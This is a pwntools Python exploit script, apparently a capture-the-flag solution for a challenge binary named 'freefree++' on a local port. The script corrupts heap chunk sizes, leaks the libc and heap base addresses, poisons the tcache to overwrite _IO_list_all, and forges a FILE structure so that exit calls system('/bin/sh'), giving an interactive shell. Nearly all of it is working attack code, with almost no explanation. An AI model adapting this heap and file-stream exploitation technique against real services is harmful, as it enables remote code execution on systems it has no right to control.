from pwn import *

context.binary = 'freefree++'

s = remote('localhost', 10010)

def malloc(var, size):
  s.sendlineafter('> ', '%s=malloc(%s)'%(var, size))
def gets(var, data):
  s.sendlineafter('> ', 'gets(%s)'%var)
  s.sendline(data)
def puts(var):
  s.sendlineafter('> ', 'puts(%s)'%var)
  return s.recvline()[:-1]
def exit():
  s.sendlineafter('> ', 'exit(0)')

"""
+    0  250 tcache
+  250   20 setup()
+  270   20 A
+  290  d50 C
+  fe0   20 fenceposts
+ 1000    - dummy end
+21000  d60 B
+21d60  280 G
+21fe0   20 fenceposts
+22000    - dummy end
+43000  d60 D
+43d60  280 F
+43fe0   20 fenceposts
+44000    - dummy end
+64000  290 E
"""

malloc('A', 0x10)
gets('A', b'a'*0x18+pack(0xd71))
malloc('B', 0xd50)
malloc('C', 0xd40)

unsorted = unpack(puts('C').ljust(8, b'\0'))
libc_base = unsorted-(0x3ebc40+0x60)
print("libc_base:", hex(libc_base))

gets('B', b'b'*0xd58+pack(0x2a1))
malloc('D', 0xd50)
gets('D', b'd'*0xd58+pack(0x2a1))
malloc('E', 0x280)
malloc('F', 0x270)
tcache = unpack(puts('F').ljust(8, b'\0'))
heap_base = tcache-0x21d70
print("heap_base:", hex(heap_base))

libc = ELF('libc-2.27.so')
libc.address = libc_base

# Aのアドレスを_IO_list_allに書き込む
gets('B', b'b'*0xd58+pack(0x281)+pack(libc.symbols._IO_list_all))
malloc('H', 0x270)
malloc('I', 0x270)
gets('I', pack(heap_base+0x280))

binsh = next(libc.search(b'/bin/sh'))
buf_end = (binsh-100)//2
_IO_str_jumps = libc.symbols._IO_file_jumps+0xc0

gets('A',
  b'\0'*0x28 +
  pack(buf_end+1) +             # +28 _IO_write_ptr
  b'\0'*0x10 +
  pack(buf_end) +               # +40 _IO_buf_end
  b'\0'*0x90 +
  pack(_IO_str_jumps) +         # +d8 vtable
  pack(libc.symbols.system))    # +90 _allocate_buffer

exit()

s.interactive()
